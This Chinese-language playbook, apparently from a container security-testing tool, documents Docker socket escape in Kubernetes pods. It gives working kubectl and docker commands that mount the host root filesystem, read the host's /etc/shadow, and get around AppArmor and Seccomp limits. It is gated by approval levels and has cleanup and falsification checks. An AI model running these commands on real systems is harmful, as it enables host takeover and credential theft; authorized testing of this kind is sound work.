---
source: manual
confidence: high
platforms: [k8s, docker]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-1.1]
mapped_compliance_families: [特权容器, 危险挂载]
---

# socket-escape — Docker Socket 逃逸

容器内可访问 `/var/run/docker.sock`，攻击者通过该 socket 在宿主机上创建特权容器并挂载根文件系统，实现容器逃逸。

---

## 1. 前置条件

- 容器以特权模式运行，或 docker.sock 被显式挂载到容器内
- 容器内存在 docker CLI（或可通过 curl 直接与 docker daemon 交互）
- 容器内 `/var/run/docker.sock` 文件存在且有读写权限

检查命令：
```bash
# [L0] 宿主机观察：检查 Pod 是否为特权容器
kubectl get pod <pod-name> -o jsonpath='{.spec.securityContext.privileged}'
# 期望输出: true

# [L0] 宿主机观察：检查 docker.sock 是否被挂载
kubectl get pod <pod-name> -o jsonpath='{.spec.volumes[*].hostPath.path}' | tr ' ' '\n' | grep docker.sock
# 期望输出: /var/run/docker.sock

# [L1] 容器内观察：确认 docker.sock 存在且可读写
kubectl exec -n <ns> <pod-name> -- ls -la /var/run/docker.sock
# 期望输出: srw-rw---- ... /var/run/docker.sock（权限含 rw）
```

## 2. 探测命令

```bash
# [L0] 宿主机观察：确认 Pod 安全上下文
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.securityContext.privileged}'
# 期望输出: true

# [L0] 宿主机观察：确认 docker.sock 挂载详情
kubectl get pod <pod-name> -n <ns> -o yaml | grep -A5 docker.sock
# 期望输出: hostPath: path: /var/run/docker.sock

# [L1] 容器内观察：确认 docker.sock 可访问
kubectl exec -n <ns> <pod-name> -- ls -la /var/run/docker.sock
# 期望输出: srw-rw---- 1 root root ... /var/run/docker.sock

# [L1] 容器内观察：确认 docker CLI 是否可用
kubectl exec -n <ns> <pod-name> -- docker version
# 期望输出: Client + Server 版本信息

# [L1] 容器内观察（无 docker CLI 时）：通过 curl 与 daemon 交互
kubectl exec -n <ns> <pod-name> -- curl -s --unix-socket /var/run/docker.sock http://localhost/version
# 期望输出: Docker daemon 版本 JSON
```

## 3. 攻击验证

```bash
# [L2] 容器内攻击验证：通过 docker.sock 创建挂载宿主机根目录的容器
kubectl exec -n <ns> <pod-name> -- docker run -d --name escape-poc -v /:/host alpine sleep 300
# 期望输出: 返回新容器 ID

# [L2] 容器内攻击验证：在逃逸容器内读取宿主机文件
kubectl exec -n <ns> <pod-name> -- docker exec escape-poc cat /host/etc/shadow
# 期望输出: root:$6$...:... (宿主机 /etc/shadow 内容)

# [L2] 容器内攻击验证：确认已在宿主机层面创建容器
kubectl exec -n <ns> <pod-name> -- docker exec escape-poc ls /host/etc/hostname
# 期望输出: /host/etc/hostname

# [L2] 清理
kubectl exec -n <ns> <pod-name> -- docker rm -f escape-poc
# 期望输出: escape-poc
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：记录宿主机现有容器列表
docker ps -a --format '{{.Names}}' | sort
# 期望输出: 攻击前无 escape-poc 容器

# [L0] 攻击后环境对比：确认逃逸容器被创建
docker ps -a --format '{{.Names}}' | sort
# 期望输出: 出现 escape-poc 容器

# [L1] 攻击前：容器内无法读取宿主机 /etc/shadow
kubectl exec -n <ns> <pod-name> -- cat /etc/shadow 2>&1
# 期望输出: No such file or directory（容器内只有自己的 /etc/shadow）

# [L2] 攻击后：通过逃逸容器读取宿主机 /etc/shadow
kubectl exec -n <ns> <pod-name> -- docker exec escape-poc cat /host/etc/shadow
# 期望输出: root:$6$...:... (宿主机 shadow 内容) → 证明逃逸成功
```

差分结论：攻击前容器内无法访问宿主机文件系统，攻击后通过 docker.sock 创建的逃逸容器成功读取宿主机 `/etc/shadow`，证明逃逸成功。

## 5. 绕过策略

```bash
# [L1] 检查 AppArmor 是否限制 docker.sock 访问
kubectl exec -n <ns> <pod-name> -- cat /proc/1/attr/current
# 若输出含 docker-socket-profile 或类似限制名 → AppArmor 可能阻断

# [L1] 检查 Seccomp 是否限制 connect 系统调用
kubectl exec -n <ns> <pod-name> -- cat /proc/1/status | grep Seccomp
# 若输出 Seccomp: 2 (strict) → 无法通过 socket 连接 daemon

# 绕过方式：
# - [L1] 若 docker.sock 存在但 docker CLI 不可用，用 curl --unix-socket 替代
# - [L1] 若 AppArmor 限制 docker CLI 但未限制 socket 文件操作，用 Python/Go socket 库直接通信
# - [L2] 若 socket 被挂载但权限不足，检查是否可通过同名 socket 在其他路径访问
```

## 6. 证伪条件

```bash
# [L1] 容器内 docker.sock 不存在
kubectl exec -n <ns> <pod-name> -- ls /var/run/docker.sock 2>&1
# 输出: No such file or directory → 证伪

# [L1] docker.sock 存在但无读写权限
kubectl exec -n <ns> <pod-name> -- test -r /var/run/docker.sock && echo "readable" || echo "not readable"
# 输出: not readable → 证伪

# [L1] docker daemon 不可达
kubectl exec -n <ns> <pod-name> -- curl -s --unix-socket /var/run/docker.sock http://localhost/version
# 无输出或连接失败 → 证伪

# [L0] Pod 非特权且无 hostPath docker.sock 挂载
kubectl get pod <pod-name> -o yaml | grep -c docker.sock
# 输出: 0 → 证伪
```

## 7. 审批级别

- **L2** 容器内攻击验证（创建逃逸容器并读取宿主机文件）→ **Level 4**（创建临时容器，需人工确认）
- **L1** 容器内探测命令 → **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Defense Evasion / Execution
- **Technique ID**: T1611
- **Technique Name**: Escape to Host
- **描述**: 攻击者通过容器内可访问的 Docker socket，在宿主机上创建特权容器并挂载宿主机根文件系统，实现从容器到宿主机的逃逸。